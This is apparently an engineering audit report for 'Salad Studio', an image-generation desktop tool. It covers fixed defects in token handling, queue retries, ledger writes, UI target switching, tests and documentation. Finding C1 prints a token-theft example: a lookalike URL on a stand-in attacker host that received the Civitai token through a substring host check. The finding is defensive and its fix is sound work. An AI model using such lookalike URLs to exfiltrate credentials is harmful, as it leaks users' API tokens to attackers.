# Salad Studio issue pass, 2026-10-17

An audit of the working tree with the fixes applied in the same pass. The tree
already carried the 2026-10-16 audit's fixes (uncommitted); this pass audited
that state, not `HEAD`.

**Method.** Four read-only area readers (code, tests, UI on a hidden window,
docs and metadata) reported candidates. The orchestrator re-drove every claim
against the shipped tree before changing anything, then fixed the real ones,
each with a check on the shipped code. Where the old form was cheap to rebuild,
or a reader had already driven it, the proof line says so; the rest are guarded
by construction (the old path cannot satisfy the new assertion). The readers'
raw reports and the decision trail are in `.audit/2026-10-17-audit.tsv`.

**Gate.** The root suite (`python -m unittest discover -s tests -p "test_*.py"`,
1149 tests), the container suite (`salad_klein`, 18 tests) and the root
structural check (`test_salad_comfy_live_findings.py`). The first baseline run
was abandoned after mid-run edits made it measure two trees at once; the final
run is the gate, captured in `.audit/audit-tests.log`.

## Verdict per surface

| surface | verdict | strongest |
|---|---|---|
| code | 10 real defects; the two that matter leak a token and can pay for a duplicate render | `request_json.with_civitai_token` matched `civitai.com` as a substring |
| tests | the suite rewrote the user's real queue ledger, and six checks could not fail | `tests/test_profiles.py` built a real window on the real `~/.config/salad/studio-queue.json` |
| UI/UX | two High defects: a commit that lied and replaced the user's graph, and a target switch that POSTed to the wrong host | `_on_prompt_commit` decided "patchable" from the parser alone |
| docs | four false claims a reader acts on, plus two stale pointers | README stated the policy precedence backwards |
| metadata | no new defect; the 2026-10-16 metadata fixes re-checked clean | `studio-metadata.json`, the recipe tables and the viewer pins still agree |

## Code

### C1, the Civitai token went to any host whose URL contained `civitai.com` (code, High, FIXED)

`salad_studio/request_json.py:687-696` and the trigger/attach pair at `:720`,
`:751` tested `"civitai.com" in url.lower()`. A graph pasted from anywhere could
carry `https://attacker.example/civitai.com/download/models/1`, and Generate
would append the token and Studio itself would `HEAD` it first.

```
needs token: True
posted: https://attacker.example/civitai.com/download/models/1?token=SECRET
probed: ['https://attacker.example/civitai.com/download/models/1']
```

**Fixed:** one `is_civitai_url` helper parses the URL and requires `https`, a
port of 443 or none, and a host equal to `civitai.com` or ending in
`.civitai.com`. `with_civitai_token`, `payload_has_civitai_download` and
`civitai_lora_urls` all use it. **Proof:**
`tests/test_request_json.py::BuildRequest.test_only_a_civitai_host_gets_the_token`
(hostile hosts, plus `http://` and port 8443) and
`::test_a_lookalike_host_is_not_authorized_or_probed`.

### C2, a POST timeout was retried, re-submitting a render the container may still be running (code, High, FIXED)

`salad_gen._req` lets `TimeoutError`/`OSError` escape; `salad_queue._run`
catches any exception as `status=0`, `classify` reads that as busy, and the job
is POSTed again up to six times. The vast path had the same shape one layer
down: `vast._send` returns `(0, b"")` for a transport failure, which `render_once`
passed straight to the queue.

**Fixed:** both `render_once` functions turn an unanswered POST into status 524
(terminal, like 504) with a message saying the work may still be rendering and
is not re-sent. **Proof:**
`tests/test_generator.py::PromptEditorPayload.test_a_timed_out_post_is_not_sent_again`
(one POST, job FAILED, message says "not re-sent") and
`::VastQueuedRender.test_an_unanswered_post_is_not_sent_again`.

### C3, the ledger's fixed `.tmp` name let two writers publish a torn file (code, Medium, FIXED)

`salad_queue.save_ledger` wrote `<name>.tmp` then replaced. Two saves from the
job worker, the Tk poll and the idle thread could interleave, and the second
replace raised `FileNotFoundError`. A torn ledger reads as `{}`, losing the
container ownership records.

**Fixed:** a unique `tempfile.mkstemp` file and a process-wide write lock; the
queue also serializes snapshot + write behind `_save_lock` so an older snapshot
cannot replace a newer one. **Proof:**
`tests/test_salad_queue.py::LockAndOrderDiscipline.test_concurrent_saves_never_publish_a_torn_ledger`
(8 threads, 80 saves, every call returns `""` and the file is one whole write).

### C4, a worker logged while holding the queue's condition lock (code, Medium, FIXED)

`enqueue` and `retry` called `self._log` inside `with self._cond`. `app.log`
marshals a non-main-thread call through `after`, which blocks until the main
loop runs it; the main loop can be inside `_refresh_queue_page` waiting for the
same lock. The result is a deadlock.

**Fixed:** both log calls moved outside the lock. **Proof:**
`::test_the_queue_logs_outside_its_condition_lock` records
`Condition.locked()` in the callback for both paths.

### C5, `head_of` read submission order, not queue order, after a Retry (code, Low, FIXED)

A failed A retried behind B stayed first in `_jobs`, so `duplicate_of_head`
could miss the real head and enqueue a duplicate render.

**Fixed:** jobs carry an `order` field, refreshed on retry, and `head_of`
returns the lowest live order. **Proof:**
`::test_a_retried_job_goes_to_the_back_of_the_line`.

### C6, `app.py` annotated three sites with `Any` and never imported it (code, Low, FIXED)

`typing.get_type_hints(queue_request_label)` raised `NameError`; Ruff reported
F821 at `app.py:197`, `:1545`, `:4297`. **Fixed:** `from typing import Any`.
**Proof:** `tests/test_entrypoint.py::ModuleEntryPoint.test_the_apps_annotations_resolve`;
`tests/test_salad_status.py` had the same missing import and gained it too.

### C7, a pasted request's `credentials` Bearer block was persisted in clear (code, Medium, FIXED)

`prompt_history._redact_request` stripped only `inputs.lora_name`, and
`_capture_ui_state` saved the editor text verbatim, contradicting
`ui_state.py:3` and `prompt_catalog.py:6-7`. The documented Salad request shape
carries exactly such a block.

**Fixed:** the redactor drops top-level `credentials` and strips `?token=` from
every string input; the window state saves a redacted copy of a parsable editor
JSON. **Proof:**
`tests/test_prompt_history.py::PromptHistoryStore.test_add_request_strips_credentials_and_every_token`.

### C8, loading a graph ran one live Civitai check per unmatched LoRA on the Tk thread (code, Medium, FIXED)

`app._rebuild_from_json` called `lora_store.add_lora` with its default
`verify=True`, so an imported graph with several unmatched LoRAs froze the
window for one 15-20 s round trip each, and persisted the rows as a side effect
of viewing.

**Fixed:** the path passes `verify=False`; Verify remains a button. **Proof:**
`tests/test_app_layout.py::NewPagesAndPlacement.test_rebuilding_from_json_does_not_verify_a_lora_on_the_main_thread`.

### C9, `_probe_url` returned on a HEAD transport failure, so the documented GET never ran (code, Low, FIXED)

The docstring and comment promised a ranged GET after a HEAD failure; the code
returned the HEAD reason. **Fixed:** a HEAD exception continues to the GET.
**Proof:** `tests/test_generator.py::CheckLoraUrls.test_a_head_transport_failure_still_tries_the_get`.

### C10, `verify_http_url` was HEAD-only, so a CDN that refuses HEAD marked a live LoRA unverified (code, Low, FIXED)

`lora_store.verify_http_url` returned False for 405/501 and for a HEAD transport
failure. **Fixed:** a 400/403/405/501 or transport failure falls through to a
one-byte ranged GET. **Proof:**
`tests/test_lora_store.py::VerifyHttpUrlFallsBackToGet.test_a_head_refusal_a_cdn_commonly_sends_is_checked_with_a_get`.

### C11, the catalog's progress file could not be read back after a crash, and a failed run exited 0 (code, Medium, FIXED)

`salad_catalog_faces.save_progress` wrote in place; `load_progress` had no
fallback, so a partial file stopped every later `--status`/`--generate`. `main`
returned 0 whatever happened, unlike its sibling probes.

**Fixed:** save uses a unique temp + replace; an unreadable file is moved aside
and the run starts fresh; `main` returns `1 if n_fail else 0`. **Proof:**
`tests/test_salad_catalog_faces.py::ProgressFileSurvivesACrash` (2 tests) and
`…::ASweepReportsATimeout...` now requires exit 1 on a failed cell.

## UI/UX

### U1, Prompt Assist reported "committed to the JSON" while replacing the loaded graph (UI, High, FIXED)

`_on_prompt_commit` decided `patchable` from `parse_request_json` alone, which
accepts any dict with a `prompt` key. When `apply_prompt_texts` could not patch
the graph it silently rebuilt the editor from Prompt Settings, yet the status
and the Logs claimed a patch. Driven on a hidden window: a `Note`/`SaveImage`
graph was destroyed and the status still read `committed to the prompts and the
JSON`.

**Fixed:** `_patch_editor_from_prompt` returns whether the loaded graph took the
text; the commit branches on that. **Proof:**
`tests/test_app_layout.py::NewPagesAndPlacement.test_commit_says_rebuilt_for_a_graph_the_patch_cannot_touch`.

### U2, switching Target to Vast.ai left the Salad gateway in the URL, and Generate POSTed there (UX, High, FIXED)

`_on_profile_mode` changed only the label. The profile then had `mode="vast"`
and a Salad gateway, and `_on_generate_vast` preferred that gateway, so the
graph went to the Salad host with no key. The reverse pairing leaked the Salad
key to a vast instance.

**Fixed:** `_repair_hosting_url` clears or replaces a URL that names the other
hosting on every mode change and profile apply; both Generate paths refuse a
target that belongs to the other hosting. **Proof:**
`…test_switching_to_vast_does_not_keep_a_salad_gateway`,
`…test_a_vast_press_with_a_salad_gateway_refuses_before_dispatch`.

### U3, selecting a Vast row changed the mark but not the target box (UX, Medium, FIXED)

The page note says the active row is Generate's target; `_on_vast_select` only
wrote `active` into the vast document, so a profile with a URL kept POSTing to
the old instance. **Fixed:** the handler writes the clicked endpoint into the
target box when the mode is vast. **Proof:**
`…test_selecting_a_vast_row_points_the_target_box_at_it`.

### U4, "Clear finished" deleted kept rows and reported "cleared 0" (UX, Medium, FIXED)

`clear_finished` counted terminal jobs in memory only, then emptied the
earlier-session history. **Fixed:** the count includes records that live only in
the ledger. **Proof:**
`tests/test_salad_queue.py::FinishedRecordTest.test_clear_finished_counts_a_row_kept_from_an_earlier_session`.

### U5, removing an image or a Vast instance deleted stored configuration without asking (UX, Medium, FIXED)

Removing an image drops every environment row filed under it (which may hold
secrets); removing a Vast row can silently change the active instance. Neither
handler asked, unlike the neighbouring deletes. **Fixed:** both ask and report
`Kept …` on a No. **Proof:**
`tests/test_app_layout.py::NewPagesAndPlacement.test_removing_an_image_asks_first_and_honours_a_no`
and `…test_removing_a_vast_instance_asks_first_and_honours_a_no`.

### U6, a failed Import conversion left the previous success sentence on the status line (UX, Medium, FIXED)

The `except` branch logged and showed a dialog but never wrote `self.status`.
**Fixed:** it writes `Refused: cannot convert the Civitai paste`. **Proof:**
`tests/test_config_page.py::TheImportPageAndTheHistoryDelete.test_a_failed_conversion_writes_a_refusal_on_the_status_line`.

### U7, "Check Salad status" was a silent no-op while a check ran (UI, Low, FIXED)

The handler returned at the busy guard with no status line, and the button was
never disabled, unlike Refresh Salad logs and Check keys. **Fixed:** the button
is kept, disabled while busy, and a press says why. **Proof:**
`tests/test_config_page.py::TheAuditOf2026_10_16.test_check_salad_status_goes_down_while_a_check_runs`.

## Tests

### T1, `test_profiles` built a real window on the user's real stores and rewrote the real queue ledger (test, High, FIXED)

`LiveCorruptProfilesFile` redirected profiles/LoRAs/history/tokens/UI state but
not `salad_queue.LEDGER_PATH`, so the queue constructor dropped a user-owned
record; `tests/test_stores.py` could not see it because its allow-list omitted
the module.

**Fixed:** the test uses `tests/test_launch._TempPaths` and `show=False`;
`test_profiles` gains the module-level ledger redirect, and `test_stores` lists
it. **Proof:** `tests/test_stores.py::EveryWindowModuleRedirectsTheLedger` now
drives five modules, including `tests.test_profiles`.

### T2, six checks could not fail (test, Medium, FIXED)

The queue page's cancel test asserted a list nothing wrote; the ABKSK check had
an `or len(loaders) >= 8` escape; the theme loop could run zero times; the
graph position check compared an object to itself; the art-root check accepted
`Path(".")`; and an app-layout assertion compared one row's name to another
row's value.

**Fixed:** the transport recorder is wired, the ABKSK assertion is exact, the
style table must be non-empty, the graph check compares a captured value, the
art root must be absolute, and the dead comparison is gone. No new tests; these
are the shipped checks, tightened.

## Docs

### D1, README stated the Config policy precedence backwards (docs, Medium, FIXED)

`salad_studio/README.md:78-81` said stored → document → live;
`salad_status.resolved_policy` implements live → stored → document. **Fixed:**
the paragraph now states the shipped order. **Proof:** read against
`salad_studio/salad_status.py:256-270`.

### D2, doc 23 called three non-importable scripts "the working callers" (docs, Medium, FIXED)

`salad_probe_ages.py`, `salad_probe_sdxl.py` and `salad_catalog_faces.py` fail
on `paperdoll_mask`/`regen_faces`. **Fixed:** doc 23 lists the three that run
here and names the Eldermark dependency for the rest, in both places.

### D3, doc 15's smoke runbook edited a placeholder no recipe carries (docs, Medium, FIXED)

`prompt_liked_style.json` node 74 already holds the real prompt. **Fixed:** the
comment says to edit node 74's positive prompt.

### D4, the first-boot download size was wrong for both tags (docs, Medium, FIXED)

Doc 15 and doc 23 said `~17 GB`. The `prefetch6-klein` tag fetches 28.0 GB and
`prefetch6-snofs` 18.1 GB. **Fixed:** both docs name the per-tag figure.

### D5, doc 14 pointed at `body_t2i` templates that no longer exist (docs, Low, FIXED)

The templates were deleted by the 2026-10-16 pass. **Fixed:** the pointer says
the body path is hand-written prose.

### D6, doc 21 sent a reader to §8 for a §4 fact (docs, Low, FIXED)

**Fixed:** it now names §4's `Stripping the LoRA stack` row.

## Deferred, with reasons

- **The history strip is mouse-only.** Every strip widget has `takefocus=0` and
  thumbnails answer only `<Button-1>`, so a keyboard user cannot open a plate.
  Reason: the fix needs a selection model, a focus ring and arrow/Return
  bindings, and its own hidden-window drive; it is a feature-sized UI change,
  not a defect patch.
- **"Fetch from Civitai" blocks the Tk thread.** `_on_fetch_civitai_image`
  calls `fetch_civitai_image_pastes` synchronously, and that chain can take
  several 20 s requests. Reason: two hidden-window modules
  (`test_import_civitai_image.py`) press the button and read the page
  immediately; the fix is the worker + `_later` pattern, and it must update
  those drives in the same change.
- **`tests/test_hostings.py` checks the dispatch with a source grep.** Reason:
  replacing it with a real press needs a recording adapter and a hidden window;
  no shipped break is hidden by it today.
- **Nine `assertIsNotNone`/`assertIsNot(..., None)` pairs.** Reason: cosmetic;
  the first assertion already carries the check.
- **Dated records left as written:** `docs/history/63` states 1080 root tests
  and 47 `test_docs_match` tests, and sums 33 findings for 30; `docs/history/60`
  says ~40 minutes for a 60-minute probe budget; `docs/issue-records.md:949`
  names the corrected doc-22 pointer. Reason: they are snapshots of the tree on
  their dates. `docs/issue-records.md`'s closure section already records the
  corrected pointer, and editing a snapshot would falsify it.

## Documentation consolidation

The same pass reduced the living docs from 15 files to 10. The ten workflow
documents became five, and the graph-pane research moved into the manual:

| before | now |
|---|---|
| `16-salad-studio-prompt-graph.md` | `salad_studio/README.md`, section "Prompt graph pane: JointJS in WebView2" |
| `19-two-body-prompt-playbook.md` | `21-klein-image-handoff.md` §9 |
| `17-klein-two-body-anatomy-research.md` | `22-two-body-correctness-research.md` §9 |
| `18-sdxl-migration-brief.md` | `22-two-body-correctness-research.md` §10 |
| `24-vast-ai-image-deployment.md` | `23-salad-container-group-deployment.md` §5 |

The bodies moved verbatim. The source H1 became the part heading, every other
heading gained one level, and code fences were untouched; each part says which
file it came from and that its subsection numbers are the source's own. The
merge script asserted that every non-empty body line reached the target before
deleting the source, and the relative links that changed depth were rewritten.
`.audit/merge-docs.log` is the move record.

The five survivors are 14 (live findings), 15 (the Klein group), 21 (handoff and
two-body prompt playbook), 22 (the two research briefs) and 23 (deployment and
vast.ai). `LIVING_DOCS` is a glob, so the count guard follows automatically; the
dated closure section in `docs/issue-records.md` now states the after count
(`20 → 10`), and its five `###`/`### N.`/appendix counts were unchanged because
no line was added to that file. The eight dated history records stay separate,
as the audit convention requires.

Prose pointers were rewritten with the move: `doc 19 §N` now reads as
`doc 21 §9, its §N`, `doc 17`/`doc 18` as `doc 22 §9`/`§10`, and `doc 24` as
`doc 23 §5`. Two history records linked the deleted graph-pane doc; their link
targets now point at the manual's section, with the dated text unchanged.

**Proof:** `tests/test_docs_match` (61 tests) and
`test_salad_comfy_live_findings.py` both pass after the merge; the link check
caught the two history links and the three manual-relative links, and all five
were repointed.

## What this pass did not reach

The WebView2 pane's rendered pixels, a live container render, and
`salad_klein/custom_nodes/` (untracked, pulled at build time). The final suite
result and the raw capture paths are in `.audit/`.
